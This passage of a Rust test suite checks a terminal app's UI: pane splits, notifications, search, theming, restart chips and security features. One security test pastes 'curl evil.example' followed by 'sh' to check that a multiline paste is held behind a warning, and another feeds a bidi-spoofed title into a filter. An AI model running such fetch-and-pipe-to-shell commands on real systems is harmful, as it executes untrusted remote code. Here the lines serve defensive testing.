    assert!(cx.update(|window, _| window.last_input_was_keyboard()));
    cx.simulate_event(gpui::FileDropEvent::Submit {
        position: at(2., 1.),
    });
    assert!(!cx.update(|window, _| window.last_input_was_keyboard()));
    cx.run_until_parked();
    assert_eq!(input(), b"\x1b[200~'/tmp/a b' '/tmp/it'\\''s' \x1b[201~");

    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            let f = Clipboard {
                text: "원격 복사".to_owned(),
            }
            .encode()
            .unwrap();
            frame(s, &f, cx);
        });
    });
    assert_eq!(clip(cx).as_deref(), Some("원격 복사"));
}

/// MK-044: 입력 대기 알림 클릭 시 해당 세션의 탭·분할 칸으로 이동하고 알림이 닫힌다.
#[gpui::test]
fn notification_click_focuses_pane_across_tabs_and_splits(cx: &mut TestAppContext) {
    #[derive(Clone)]
    struct Dynamic(Arc<std::sync::Mutex<sidebar::Snapshot>>);
    impl sidebar::Source for Dynamic {
        fn fetch(&self) -> std::io::Result<sidebar::Snapshot> {
            Ok(self.0.lock().unwrap().clone())
        }
    }

    let source = Dynamic(Arc::new(std::sync::Mutex::new(sidebar::Snapshot {
        sessions: vec![
            sidebar::Session {
                id: krill_proto::SessionId(11),
                status: krill_proto::control::AgentStatus {
                    state: krill_proto::control::AgentState::Working,
                    agent: "claude".into(),
                    since_unix_ns: 1,
                    ..krill_proto::control::AgentStatus::UNKNOWN
                },
                worktree: Some("/repo/wt-a".into()),
                cwd: Some("/repo/wt-a".into()),
                account: None,
            },
            sidebar::Session {
                id: krill_proto::SessionId(22),
                status: krill_proto::control::AgentStatus {
                    state: krill_proto::control::AgentState::Working,
                    agent: "codex".into(),
                    since_unix_ns: 1,
                    ..krill_proto::control::AgentStatus::UNKNOWN
                },
                worktree: Some("/repo/wt-b".into()),
                cwd: Some("/repo/wt-b".into()),
                account: None,
            },
        ],
        trees: [(
            "/repo".into(),
            vec!["/repo/wt-a".into(), "/repo/wt-b".into()],
        )]
        .into(),
    })));

    let (view, vcx) = open(cx, state_path("alert-focus"));
    // 탭 0: 왼쪽 칸(pane_a = 세션 11) + 오른쪽 분할 칸(pane_b = 세션 22), 그 뒤 새 탭(탭 1)으로 이동.
    vcx.simulate_keystrokes("cmd-d");
    let (pane_a, pane_b) = vcx.update(|_, cx| {
        view.update(cx, |s, cx| {
            let visible = s.layout.visible();
            let (a, b) = (visible[0], visible[1]);
            s.change(true, cx, |l| {
                l.set_session(a, krill_proto::SessionId(11));
                l.set_session(b, krill_proto::SessionId(22));
            });
            s.sidebar
                .update(cx, |sb, cx| sb.connect_source(Arc::new(source.clone()), cx));
            (a, b)
        })
    });
    vcx.simulate_keystrokes("cmd-t");
    vcx.run_until_parked();
    assert_eq!(layout_of(&view, vcx).active(), 1);
    assert_ne!(layout_of(&view, vcx).active_tab().focused, pane_a);
    assert_ne!(layout_of(&view, vcx).active_tab().focused, pane_b);

    // 500ms(< 5초) 안에 세션 11이 Waiting으로 전환되면 "pane:11" 알림이 뜬다.
    source.0.lock().unwrap().sessions[0].status = krill_proto::control::AgentStatus {
        state: krill_proto::control::AgentState::Waiting,
        agent: "claude".into(),
        since_unix_ns: 2,
        ..krill_proto::control::AgentStatus::UNKNOWN
    };
    vcx.executor().advance_clock(Duration::from_millis(500));
    vcx.run_until_parked();

    let notif = vcx
        .delivered_system_notifications()
        .into_iter()
        .find(|n| n.tag.as_ref() == "pane:11")
        .expect("pane:11 notification should be shown within 500ms");

    // 알림을 클릭하면 탭 0의 pane_a(세션 11)로 포커스가 이동하고 알림이 닫힌다.
    vcx.simulate_system_notification_response(gpui::SystemNotificationResponse {
        tag: notif.tag,
        action_id: None,
    });
    vcx.run_until_parked();
    let l = layout_of(&view, vcx);
    assert_eq!(l.active(), 0);
    assert_eq!(l.active_tab().focused, pane_a);
    assert_eq!(
        l.session(l.active_tab().focused),
        Some(krill_proto::SessionId(11))
    );
    assert!(
        !vcx.delivered_system_notifications()
            .iter()
            .any(|n| n.tag.as_ref() == "pane:11")
    );

    // 정리: Working 세션을 비워 잠자기 방지 assertion을 해제한다.
    source.0.lock().unwrap().sessions.clear();
    vcx.executor().advance_clock(Duration::from_millis(500));
    vcx.run_until_parked();
}

/// OWE-534: 칸 크기를 재서 붙은 연결로 `Resize`·`Focus`를 보내고, 칸을 나누면 줄어든 폭을 다시 보낸다.
#[gpui::test]
fn pane_size_reaches_session_and_follows_split(cx: &mut TestAppContext) {
    use std::os::unix::net::UnixStream;

    use krill_proto::roles;
    use krill_proto::screen::Msg as _;

    let (view, cx) = open(cx, state_path("fit"));
    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs
        .set_read_timeout(Some(std::time::Duration::from_secs(2)))
        .unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            let mut l = Live::new(Task::ready(()));
            l.pane.link(
                krill_proto::SessionId(3),
                1,
                pane::Writer::spawn(ours).unwrap(),
                krill_proto::input::FEAT_INPUT | roles::FEAT_ROLES,
                Now::get(),
            );
            s.live.insert(pane, l);
            cx.notify();
        });
    });
    cx.run_until_parked();
    cx.executor().advance_clock(Duration::from_millis(75));
    cx.run_until_parked();
    let mut next = || {
        let (k, b) = krill_proto::ipc::read_frame(&mut theirs).unwrap().unwrap();
        roles::Request::decode(k, &b).unwrap()
    };
    let roles::Request::Resize { cols, rows } = next() else {
        panic!("resize first");
    };
    assert_eq!(next(), roles::Request::Focus);
    let grid = cx.update(|_, cx| view.read(cx).live[&pane].pane.grid());
    assert_eq!(grid, Some((cols, rows)));
    assert!(cols > 10 && rows > 5, "{cols}x{rows}");
    let (viewport, (bounds, cell)) = cx.update(|window, cx| {
        (
            window.viewport_size(),
            view.read(cx).live[&pane].painted.get(),
        )
    });
    assert!(
        bounds.origin.y + cell.height * f32::from(rows)
            <= viewport.height - krill_app::ui::STATUS_BAR_HEIGHT - krill_app::ui::SPACE_2,
        "terminal bottom must not clip into bottom padding or status bar"
    );

    cx.simulate_keystrokes("cmd-d");
    cx.run_until_parked();
    cx.executor().advance_clock(Duration::from_millis(75));
    cx.run_until_parked();
    let roles::Request::Resize {
        cols: half,
        rows: same,
    } = next()
    else {
        panic!("resize after split");
    };
    assert_eq!(next(), roles::Request::Focus);
    // OWE-653: 단일 칸은 패인 헤더가 없고 분할하면 헤더 줄이 생겨 행이 그만큼 줄 수 있다.
    assert!(
        half < cols && same <= rows && same + 2 >= rows,
        "{cols}x{rows} -> {half}x{same}"
    );
}

/// AS-01: `fit_probe` 측정 요소(`canvas().absolute().size_full()`)가 재는 영역을 실측한다.
/// `render_pane`과 같은 구조(패딩 8 몸통 > `size_full().relative()` 안쪽 > 절대 측정 요소).
/// 내용 박스(384×284)를 재면 정상, 패딩 박스(400×300)를 재면 PTY가 1~2열·1행 과대다.
struct ProbeBounds {
    seen: std::rc::Rc<std::cell::RefCell<Option<gpui::Bounds<gpui::Pixels>>>>,
}
impl gpui::Render for ProbeBounds {
    fn render(
        &mut self,
        _window: &mut gpui::Window,
        _cx: &mut gpui::Context<Self>,
    ) -> impl gpui::IntoElement {
        let seen = self.seen.clone();
        gpui::div()
            .size(gpui::px(400.))
            .h(gpui::px(300.))
            .p(gpui::px(8.))
            .child(
                gpui::div().size_full().relative().child(
                    gpui::canvas(
                        move |bounds, _, _| {
                            seen.replace(Some(bounds));
                        },
                        |_, (), _, _| {},
                    )
                    .absolute()
                    .size_full(),
                ),
            )
    }
}
// `canvas` paint 클로저의 2번째 인자는 `()`다(`fit.rs`의 측정 요소와 같은 모양).
#[gpui::test]
fn probe_measures_content_box_of_padded_pane(cx: &mut TestAppContext) {
    let seen: std::rc::Rc<std::cell::RefCell<Option<gpui::Bounds<gpui::Pixels>>>> =
        std::rc::Rc::default();
    let seen_probe = seen.clone();
    let (_view, cx) = cx.add_window_view(|_, _| ProbeBounds { seen: seen_probe });
    cx.run_until_parked();
    let bounds = seen.borrow().expect("probe painted");
    assert_eq!(
        (bounds.size.width, bounds.size.height),
        (gpui::px(384.), gpui::px(284.)),
        "probe must measure the content box, not the padding box"
    );
}

/// OWE-575: 타이틀바의 좌우 패널 토글 버튼·단축키가 사이드바와 오른쪽 패널을 접고 펴며, 하단 상태 바가 렌더링된다.
#[gpui::test]
fn titlebar_collapse_toggles_and_status_bar(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("chrome"));
    cx.run_until_parked();

    assert!(cx.debug_bounds("sidebar-column").is_some());
    assert!(cx.debug_bounds("panel-column").is_some());
    assert!(cx.debug_bounds("status-bar").is_some());
    assert!(cx.debug_bounds("status-daemon").is_some());
    assert!(cx.debug_bounds("status-usage").is_some());
    assert!(cx.update(|_, cx| view.read(cx).diff.read(cx).is_visible()));

    let sidebar_btn = cx.debug_bounds("toggle-sidebar").unwrap();
    cx.simulate_mouse_down(
        sidebar_btn.center(),
        MouseButton::Left,
        Modifiers::default(),
    );
    cx.simulate_mouse_up(
        sidebar_btn.center(),
        MouseButton::Left,
        Modifiers::default(),
    );
    cx.run_until_parked();
    assert!(cx.debug_bounds("sidebar-column").is_none());

    cx.simulate_keystrokes("cmd-b");
    cx.run_until_parked();
    assert!(cx.debug_bounds("sidebar-column").is_some());

    let panel_btn = cx.debug_bounds("toggle-panel").unwrap();
    cx.simulate_mouse_down(panel_btn.center(), MouseButton::Left, Modifiers::default());
    cx.simulate_mouse_up(panel_btn.center(), MouseButton::Left, Modifiers::default());
    cx.run_until_parked();
    assert!(cx.debug_bounds("panel-column").is_none());
    assert!(!cx.update(|_, cx| view.read(cx).diff.read(cx).is_visible()));

    cx.simulate_keystrokes("cmd-alt-b");
    cx.run_until_parked();
    assert!(cx.debug_bounds("panel-column").is_some());
    assert!(cx.update(|_, cx| view.read(cx).diff.read(cx).is_visible()));

    let inner_collapse = cx.debug_bounds("diff-collapse").unwrap();
    cx.simulate_mouse_down(
        inner_collapse.center(),
        MouseButton::Left,
        Modifiers::default(),
    );
    cx.simulate_mouse_up(
        inner_collapse.center(),
        MouseButton::Left,
        Modifiers::default(),
    );
    cx.run_until_parked();
    assert!(cx.debug_bounds("panel-column").is_none());
    assert!(!cx.update(|_, cx| view.read(cx).diff.read(cx).is_visible()));
}

/// MK-032·MK-052: 콜드 복원 화면과 종료된 라이브 세션(`CLOSED`) 모두 Restart 칩을 띄우고 누르면 세션을 비운다.
#[gpui::test]
fn cold_and_closed_pane_show_restart_chip(cx: &mut TestAppContext) {
    use krill_proto::control::Cold;
    use krill_proto::screen::{Closed, Msg as _, Op, Seq};

    let (view, cx) = open(cx, state_path("restart-chip"));
    let pane = layout_of(&view, cx).active_tab().focused;
    assert_eq!(pane.get(), 0);
    let (ours, _theirs) = UnixStream::pair().unwrap();
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.layout.set_session(pane, krill_proto::SessionId(11));
            s.attach_test(pane, krill_proto::SessionId(11), ours, cx);
        });
    });
    cx.run_until_parked();
    assert!(cx.debug_bounds("restart-0").is_none());

    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            let closed = Closed { seq: Seq(1) }.encode().unwrap();
            let (k, b) = ipc::read_frame(&mut &closed[..]).unwrap().unwrap();
            assert!(!s.on_frame(pane, k, &b, cx));
        });
    });
    cx.run_until_parked();
    let chip = cx
        .debug_bounds("restart-0")
        .expect("closed pane shows restart chip");
    cx.simulate_mouse_down(chip.center(), MouseButton::Left, Modifiers::default());
    cx.simulate_mouse_up(chip.center(), MouseButton::Left, Modifiers::default());
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).session(pane), None);

    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.layout.set_session(pane, krill_proto::SessionId(12));
            s.live.insert(pane, Live::new(Task::ready(())));
            s.cold(
                pane,
                krill_proto::SessionId(12),
                Cold {
                    screen: vec![Op::Reset { cols: 10, lines: 2 }],
                    history: Vec::new(),
                },
                cx,
            );
        });
    });
    cx.run_until_parked();
    let chip = cx
        .debug_bounds("restart-0")
        .expect("cold pane shows restart chip");
    cx.simulate_mouse_down(chip.center(), MouseButton::Left, Modifiers::default());
    cx.simulate_mouse_up(chip.center(), MouseButton::Left, Modifiers::default());
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).session(pane), None);
}

/// MK-059(OWE-584): ⌘F로 검색 바를 열어 검색어 입력·이전/다음 이동 시 SEARCH 요청을 보내고,
/// `SEARCH_RESULT` 응답으로 일치 칸 하이라이트·상태 문구를 갱신하며 Esc로 닫는다.
#[gpui::test]
fn cmd_f_search_bar_requests_and_highlights(cx: &mut TestAppContext) {
    use krill_app::terminal::Highlight;
    use krill_proto::screen::{Cell, Msg as _, Op, Revision, Seq, encode_update};
    use krill_proto::search::{
        Cursor, Direction, Hit, SearchRequest, SearchResult, Snapshot, Source as SearchSource,
    };

    let (view, cx) = open(cx, state_path("search"));
    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    let row = |t: &str| {
        t.chars()
            .map(|ch| Cell {
                ch,
                ..Cell::default()
            })
            .collect()
    };
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(7), ours, cx);
            let ops = vec![
                Op::Reset { cols: 20, lines: 2 },
                Op::Line {
                    line: 0,
                    cells: row("first line"),
                },
                Op::Line {
                    line: 1,
                    cells: row("second match"),
                },
            ];
            let f = &encode_update(Revision(1), Seq(1), ops).unwrap()[0];
            let (k, b) = ipc::read_frame(&mut &f[..]).unwrap().unwrap();
            assert!(s.on_frame(pane, k, &b, cx));
        });
    });
    cx.run_until_parked();

    // ⌘F로 검색 바를 열고 "match"를 치면 마지막 입력 150ms 뒤 SearchRequest 하나가 나간다.
    cx.simulate_keystrokes("cmd-f");
    cx.run_until_parked();
    assert!(cx.update(|_, cx| view.read(cx).search.is_some()));

    cx.simulate_input("match");
    cx.run_until_parked();
    theirs.set_nonblocking(true).unwrap();
    assert!(ipc::read_frame(&mut theirs).is_err());
    cx.executor().advance_clock(Duration::from_millis(149));
    cx.run_until_parked();
    assert!(ipc::read_frame(&mut theirs).is_err());
    cx.executor().advance_clock(Duration::from_millis(1));
    cx.run_until_parked();
    let mut requests = Vec::new();
    while let Ok(Some((k, b))) = ipc::read_frame(&mut theirs) {
        requests.push(SearchRequest::decode(k, &b).unwrap());
    }
    assert_eq!(requests.len(), 1);
    let req1 = requests.pop().unwrap();
    assert_eq!(req1.query, "match");
    assert_eq!(req1.direction, Direction::Next);
    assert_eq!(req1.after, None);

    // SEARCH_RESULT 응답을 보내면 하이라이트와 검색 바 상태("2/3")가 반영된다.
    let snap = Snapshot {
        revision: Revision(1),
        seq: Seq(1),
        oldest: Seq(0),
        pages: 0,
    };
    let res = SearchResult {
        req: req1.req,
        snapshot: snap,
        total: 3,
        hit: Some(Hit {
            index: 1,
            source: SearchSource::Screen,
            row: 1,
            total_rows: 2,
            column: 7,
            cols: 5,
            cells: row("second match"),
        }),
        wrapped: false,
        stale: false,
        incomplete: false,
        approximate: false,
    };
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            let f = res.encode().unwrap();
            let (k, b) = ipc::read_frame(&mut &f[..]).unwrap().unwrap();
            assert!(s.on_frame(pane, k, &b, cx));
        });
    });
    cx.run_until_parked();
    assert_eq!(
        cx.update(|_, cx| view.read(cx).live[&pane].pane.highlight()),
        Some(Highlight {
            line: 1,
            column: 7,
            cols: 5,
        })
    );
    assert_eq!(
        cx.update(|_, cx| {
            view.read(cx)
                .search
                .as_ref()
                .map(|(b, _)| b.read(cx).status().to_owned())
        }),
        Some("2/3".to_owned())
    );

    // ↑(이전) 키를 누르면 Cursor가 담긴 Previous 요청이 나간다.
    cx.simulate_keystrokes("up");
    cx.run_until_parked();
    let (k, b) = ipc::read_frame(&mut theirs).unwrap().unwrap();
    let req2 = SearchRequest::decode(k, &b).unwrap();
    assert_eq!(req2.direction, Direction::Previous);
    assert_eq!(
        req2.after,
        Some(Cursor {
            snapshot: snap,
            index: 1,
        })
    );

    // Esc로 닫으면 검색 바와 하이라이트가 사라진다.
    cx.simulate_keystrokes("escape");
    cx.run_until_parked();
    assert!(cx.update(|_, cx| view.read(cx).search.is_none()));
    assert_eq!(
        cx.update(|_, cx| view.read(cx).live[&pane].pane.highlight()),
        None
    );
}

#[gpui::test]
fn tabs_middle_close_and_drag_keep_session_identity(cx: &mut TestAppContext) {
    let path = state_path("tab-pointer");
    let (view, cx) = open(cx, path.clone());
    cx.simulate_keystrokes("cmd-t cmd-t");
    cx.run_until_parked();
    let before = layout_of(&view, cx);
    let first = cx.debug_bounds("session-tab-0").unwrap();
    let last = cx.debug_bounds("session-tab-2").unwrap();
    drag(cx, first.center(), last.center());
    let after = layout_of(&view, cx);
    assert_eq!(after.tabs()[2], before.tabs()[0]);
    assert_eq!(after.active_tab(), before.active_tab());
    assert_eq!(Layout::load(&path).unwrap(), after);

    let tab = cx.debug_bounds("session-tab-0").unwrap();
    cx.simulate_mouse_down(tab.center(), MouseButton::Middle, Modifiers::default());
    cx.simulate_mouse_up(tab.center(), MouseButton::Middle, Modifiers::default());
    cx.run_until_parked();
    let closed = layout_of(&view, cx);
    assert_eq!(closed.tabs().len(), 2);
    assert_eq!(closed.active_tab(), after.active_tab());
    assert_eq!(Layout::load(&path).unwrap(), closed);
}

/// OWE-590: 렌더 팔레트·설정 변경·시스템 외관·재연결의 재전송을 같은 인메모리 IPC로 확인한다.
#[gpui::test]
fn terminal_palette_push_tracks_theme_and_reconnect(cx: &mut TestAppContext) {
    use gpui_component::ThemeMode;
    use krill_proto::screen::Msg as _;
    use std::cell::RefCell;
    use std::io::{self, Write};

    struct Memory(Rc<RefCell<Vec<u8>>>);
    impl Write for Memory {
        fn write(&mut self, b: &[u8]) -> io::Result<usize> {
            self.0.borrow_mut().extend_from_slice(b);
            Ok(b.len())
        }
        fn flush(&mut self) -> io::Result<()> {
            Ok(())
        }
    }
    let (view, cx) = open(cx, state_path("theme"));
    let frames = Rc::new(RefCell::new(Vec::new()));
    cx.update(|_, cx| {
        krill_app::settings::init_at(None, cx);
        view.update(cx, |this, cx| {
            this.appearance = Some(Box::new(Memory(Rc::clone(&frames))));
            this.push_appearance(cx);
        });
    });
    for (mode, want) in [
        (ThemeMode::Dark, krill_app::ui::TERMINAL_DARK),
        (ThemeMode::Light, krill_app::ui::TERMINAL_LIGHT),
    ] {
        cx.update(|_, cx| krill_app::ui::apply(mode, cx));
        cx.run_until_parked();
        cx.update(|_, cx| assert_eq!(view.read(cx).terminal_theme, want));
        let bytes = frames.borrow_mut().split_off(0);
        let mut bytes = bytes.as_slice();
        let mut last = None;
        while let Some((k, b)) = ipc::read_frame(&mut bytes).unwrap() {
            last = Some(Push::decode(k, &b).unwrap());
        }
        assert_eq!(last.unwrap().theme, want);
    }
    cx.update(|window, cx| {
        krill_app::settings::system_appearance_changed(gpui::WindowAppearance::Dark, cx);
        window.refresh();
    });
    cx.run_until_parked();
    cx.update(|_, cx| assert_eq!(view.read(cx).terminal_theme, krill_app::ui::TERMINAL_DARK));
    frames.borrow_mut().clear();
    cx.update(|_, cx| {
        view.update(cx, |this, cx| {
            this.appearance = None;
            // 재접속하면 새 Writer에 최신 값을 다시 보낸다.
            this.appearance = Some(Box::new(Memory(Rc::clone(&frames))));
            this.push_appearance(cx);
        });
    });
    let bytes = frames.borrow();
    let (k, b) = ipc::read_frame(&mut bytes.as_slice()).unwrap().unwrap();
    assert_eq!(
        Push::decode(k, &b).unwrap().theme,
        krill_app::ui::TERMINAL_DARK
    );
}

/// MK-076: OSC 8 호버 미리보기·Cmd+클릭 전용 열기, 제목 제어문자 필터, 비-bracketed 여러 줄 붙여넣기 경고,
/// Secure Keyboard Entry 토글 및 비활성 창 자동 해제를 검증한다.
#[gpui::test]
fn security_link_preview_title_filter_multiline_paste_and_secure_input(cx: &mut TestAppContext) {
    use std::io::Read as _;

    use krill_proto::input::Input;
    use krill_proto::screen::{Link as ScreenLink, Msg as _, Op, Revision, Seq, encode_update};
    use krill_proto::term_modes::{Modes, TERM_MODES};

    let (view, cx) = open(cx, state_path("security"));
    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;

    // 1. 제목 제어문자·양방향(bidi) 필터 + OSC 8 링크 설정
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(11), ours, cx);
            let ops = vec![
                Op::Reset { cols: 20, lines: 4 },
                Op::Title("정상\x07\x1b\u{202e}txt.exe\u{202c}제목".into()),
                Op::Links {
                    line: 0,
                    links: vec![ScreenLink {
                        column: 0,
                        cols: 4,
                        uri: "https://example.com/보안".into(),
                    }],
                },
            ];
            let frame = &encode_update(Revision(1), Seq(0), ops).unwrap()[0];
            let (k, body) = ipc::read_frame(&mut &frame[..]).unwrap().unwrap();
            assert!(s.on_frame(pane, k, &body, cx));
        });
    });
    cx.run_until_parked();
    assert_eq!(
        cx.update(|_, cx| view.read(cx).titles.get(&pane).cloned()),
        Some("정상txt.exe제목".to_owned())
    );

    // 2. OSC 8 호버 미리보기: 마우스를 링크 셀 위로 옮기면 실제 대상 URL 미리보기가 뜨고, 일반 클릭으로는 열리지 않는다.
    let (bounds, cell) = cx.update(|_, cx| view.read(cx).live[&pane].painted.get());
    let link_pt = point(
        bounds.origin.x + cell.width / 2.,
        bounds.origin.y + cell.height / 2.,
    );
    let empty_pt = point(
        bounds.origin.x + cell.width * 8.,
        bounds.origin.y + cell.height / 2.,
    );
    cx.simulate_mouse_move(link_pt, None, Modifiers::default());
    cx.run_until_parked();
    assert_eq!(
        cx.update(|_, cx| view.read(cx).security.hover_uri(pane).map(str::to_owned)),
        Some("https://example.com/보안".to_owned())
    );
    cx.simulate_mouse_down(link_pt, MouseButton::Left, Modifiers::default());
    cx.simulate_mouse_up(link_pt, MouseButton::Left, Modifiers::default());
    assert_eq!(cx.opened_url(), None, "일반 클릭은 URL을 열지 않는다");

    cx.simulate_mouse_move(empty_pt, None, Modifiers::default());
    cx.run_until_parked();
    assert_eq!(
        cx.update(|_, cx| view.read(cx).security.hover_uri(pane).map(str::to_owned)),
        None
    );

    // 3. 여러 줄 붙여넣기 경고: bracketed paste가 꺼져 있을 때 개행이 포함되면 즉시 전송하지 않고 경고 배너에 보류한다.
    cx.update(|_, cx| {
        cx.write_to_clipboard(ClipboardItem::new_string("curl evil.example\nsh\n".into()));
    });
    cx.simulate_keystrokes("cmd-v");
    cx.run_until_parked();
    let pending_lines = cx.update(|_, cx| view.read(cx).security.pending_paste().map(|p| p.lines));
    assert_eq!(pending_lines, Some(2));
    theirs.set_nonblocking(true).unwrap();
    assert!(
        theirs.read(&mut [0; 16]).is_err(),
        "경고 확인 전에는 PTY로 바이트가 전송되지 않아야 한다"
    );

    // 취소하면 전송 없이 보류가 해제된다.
    cx.update(|_, cx| view.update(cx, Shell::cancel_pending_paste));
    assert!(cx.update(|_, cx| view.read(cx).security.pending_paste().is_none()));
    assert!(theirs.read(&mut [0; 16]).is_err());

    // 다시 붙여넣고 확인(붙여넣기 실행)을 누르면 그때 전송된다(줄바꿈은 \r로 인코딩됨).
    cx.simulate_keystrokes("cmd-v");
    cx.update(|window, cx| view.update(cx, |s, cx| s.confirm_pending_paste(window, cx)));
    theirs.set_nonblocking(false).unwrap();
    let (k, body) = ipc::read_frame(&mut theirs).unwrap().unwrap();
    assert_eq!(
        Input::decode(k, &body).unwrap().bytes,
        b"curl evil.example\rsh\r"
    );

    // bracketed paste가 켜진 상태에서는 경고 없이 `\x1b[200~...\x1b[201~`로 감싸(ESC·^C 제거) 즉시 전송한다.
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            let modes = Modes {
                kitty: 0,
                flags: Modes::BRACKETED_PASTE,
            };
            let body = postcard::to_stdvec(&modes).unwrap();
            assert!(s.on_frame(pane, TERM_MODES, &body, cx));
        });
        cx.write_to_clipboard(ClipboardItem::new_string("line1\x1b\x03\nline2".into()));
    });
    cx.simulate_keystrokes("cmd-v");
    assert!(cx.update(|_, cx| view.read(cx).security.pending_paste().is_none()));
    let (k, body) = ipc::read_frame(&mut theirs).unwrap().unwrap();
    assert_eq!(
        Input::decode(k, &body).unwrap().bytes,
        b"\x1b[200~line1\nline2\x1b[201~"
    );

    // 4. Secure Keyboard Entry: 토글 시 켜지고, 창이 비활성화되면 OS 수준 잠금만 자동 해제된다.
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            assert!(!s.security.is_secure_keyboard_enabled());
            s.toggle_secure_keyboard(cx);
            assert!(s.security.is_secure_keyboard_enabled());
            assert!(krill_app::platform::is_secure_event_input_engaged());

            s.on_window_active_changed(false, cx);
            assert!(
                s.security.is_secure_keyboard_enabled(),
                "사용자 설정 자체는 유지된다"
            );
            assert!(
                !krill_app::platform::is_secure_event_input_engaged(),
                "창이 뒤로 가면 다른 앱 단축키가 막히지 않게 OS 보안 입력을 해제한다"
            );

            s.on_window_active_changed(true, cx);
            assert!(krill_app::platform::is_secure_event_input_engaged());

            s.toggle_secure_keyboard(cx);
            assert!(!s.security.is_secure_keyboard_enabled());
            assert!(!krill_app::platform::is_secure_event_input_engaged());
        });
    });
}

#[gpui::test]
fn default_launch_uses_home_directory(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("home-default"));
    view.update(cx, |s, _| {
        let home = std::env::var_os("HOME").unwrap();
        assert_eq!(
            s.launch_for(s.layout.active_tab().focused).cwd,
            home.as_os_str().as_bytes()
        );
        assert_eq!(s.folder(), PathBuf::from(home));
    });
    // UI-2의 터미널 메뉴와 같은 NewTab 액션(⌘T)도 기본 홈을 사용한다.
    cx.simulate_keystrokes("cmd-t");
    view.update(cx, |s, cx| {
        let home = std::env::var_os("HOME").unwrap();
        assert_eq!(s.layout.tabs().len(), 2);
        assert_eq!(
            s.launch_for(s.layout.active_tab().focused).cwd,
            home.as_os_str().as_bytes()
        );
        // 새 세션 메뉴의 에이전트도 공통 폴더 경로를 이어받는다.
        s.new_agent("codex".into(), cx);
        assert_eq!(s.folder(), PathBuf::from(home));
    });
}

#[gpui::test]
fn invalid_layout_shows_notice_and_preserves_original(cx: &mut TestAppContext) {
    let path = state_path("invalid-notice");
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(&path, b"broken").unwrap();
    let (view, cx) = open(cx, path.clone());
    view.update(cx, |s, cx| {
        assert!(s.notice.is_some(), "recovery must be visible");
        s.change(true, cx, Layout::new_tab);
    });
    assert_eq!(
        std::fs::read(path.with_extension("corrupt")).unwrap(),
        b"broken"
    );
}

#[gpui::test]
fn closed_pane_offers_restart_and_close(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("closed-pane"));
    let pane = layout_of(&view, cx).active_tab().focused;
    let (ours, _theirs) = UnixStream::pair().unwrap();
    view.update(cx, |s, cx| {
        s.layout.set_session(pane, krill_proto::SessionId(83));
        s.attach_test(pane, krill_proto::SessionId(83), ours, cx);
        assert!(!s.on_frame(pane, krill_proto::screen::kind::CLOSED, &[0], cx));
    });
    cx.run_until_parked();
    assert!(cx.debug_bounds("session-ended").is_some());
    assert!(cx.debug_bounds("close-ended-pane").is_some());
    let button = cx.debug_bounds("restart-0").unwrap();
    cx.simulate_mouse_down(button.center(), MouseButton::Left, Modifiers::default());
    cx.simulate_mouse_up(button.center(), MouseButton::Left, Modifiers::default());
    cx.run_until_parked();
    view.update(cx, |s, _| {
        assert_eq!(s.layout.session(pane), None);
        assert!(!s.live.contains_key(&pane));
    });
}

#[gpui::test]
fn unreadable_layout_disables_saving(cx: &mut TestAppContext) {
    let path = state_path("unreadable-layout");
    std::fs::create_dir_all(&path).unwrap();
    let (view, cx) = open(cx, path.clone());
    view.update(cx, |s, cx| {
        assert!(s.notice.is_some());
        assert!(s.path.is_none(), "failed preservation must disable saving");
        s.change(true, cx, Layout::new_tab);
    });
    assert!(path.is_dir());
    assert!(!path.with_extension("tmp").exists());
}

#[gpui::test]
fn close_ended_pane_targets_its_own_pane(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("close-ended-pane"));
    let ended = layout_of(&view, cx).active_tab().focused;
    let (ours, _theirs) = UnixStream::pair().unwrap();
    view.update(cx, |s, cx| {
        s.change(true, cx, |l| l.split(Axis::Horizontal));
        s.attach_test(ended, krill_proto::SessionId(83), ours, cx);
        assert!(!s.on_frame(ended, krill_proto::screen::kind::CLOSED, &[0], cx));
    });
    cx.run_until_parked();
    let other = layout_of(&view, cx).active_tab().focused;
    let button = cx.debug_bounds("close-ended-pane").unwrap();
    cx.simulate_mouse_down(button.center(), MouseButton::Left, Modifiers::default());
    cx.simulate_mouse_up(button.center(), MouseButton::Left, Modifiers::default());
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).visible(), [other]);
}

#[gpui::test]
fn update_ready_waits_for_successful_link(cx: &mut TestAppContext) {
    let state = std::env::temp_dir().join(format!("mk-shell-ready-{}", std::process::id()));
    std::fs::remove_dir_all(&state).ok();
    let (view, cx) = open(cx, state_path("update-ready"));
    let ready = krill_app::updater::ready_path(&state, env!("CARGO_PKG_VERSION"));
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.arm_update_ready(state.clone());
            let pane = s.layout.active_tab().focused;
            let session = krill_proto::SessionId(599);
            s.live.insert(pane, Live::new(Task::ready(())));
            assert!(matches!(
                s.settled(pane, Err(std::io::ErrorKind::ConnectionRefused.into()), cx),
                Next::Retry
            ));
            assert!(!ready.exists());
            let (socket, peer) = UnixStream::pair().unwrap();
            let linked = pane::Linked {
